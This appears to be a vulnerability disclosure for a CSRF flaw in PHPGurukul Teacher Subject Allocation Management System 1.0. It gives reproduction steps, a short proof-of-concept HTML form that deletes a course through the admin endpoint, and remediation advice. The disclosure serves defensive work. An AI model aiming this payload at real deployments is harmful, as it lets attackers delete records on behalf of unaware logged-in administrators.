## Teacher Subject Allocation Management System V1.0


**Bug Description:**

A Cross Site Request Forgery (CSRF) vulnerability in "/admin/course.php" endpoint of PHPGurukul Teacher Subject Allocation Management System 1.0  allows attackers to "Delete a Course" via a crafted html request.

**Steps to Reproduce:** 

```
# Exploit Title: Cross Site Request Forgery (CSRF) vulnerability in PHPGurukul Teacher Subject Allocation Management System
# Date: 09-12-2023
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE : 
```


To reproduce the attack:

1- Head to the http://localhost/tsas/admin/course.php endpoint after logging into the admin account.

<img width="959" alt="1" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/cf0e76d8-a50f-4e45-bdaf-25740fbac04a">



2- Here you can see that we are going to delete the "Data Science and Machine Learning" course , for that we will use the HTML code we have written.

<img width="394" alt="2" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/113752cf-d519-431e-b452-f84432cff939">



```
<html>
  <!-- CSRF PoC For Deleting Course - by Dhabaleshwar Das -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/tsas/admin/course.php">
      <input type="hidden" name="delid" value="1806" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```


3- We'll then execute this HTML code and we successfully see that the record has been deleted successfully.

<img width="616" alt="3" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/a6548d82-5b63-4b7a-aac0-7fa841f4f1be">



4- This shows that the endpoint "/admin/course.php" is vulnerable to CSRF attack.

<img width="947" alt="4" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/1e5aea71-b140-4255-892d-35982c1d7cb1">



5- CSRF attacks can lead to unauthorized actions being performed on behalf of a user. An attacker could manipulate data within the application, leading to the creation, modification, or deletion of records.

**Remediation:** 

1- Implement anti-CSRF tokens (also known as CSRF tokens or synchronizer tokens) in web forms. These tokens are unique per session and are embedded in the HTML form. The server validates the token with each form submission, ensuring that the request is legitimate.

2- Set the SameSite attribute on cookies to control when they are sent with cross-origin requests. This helps mitigate the risk of CSRF by preventing the automatic inclusion of cookies in cross-site requests.
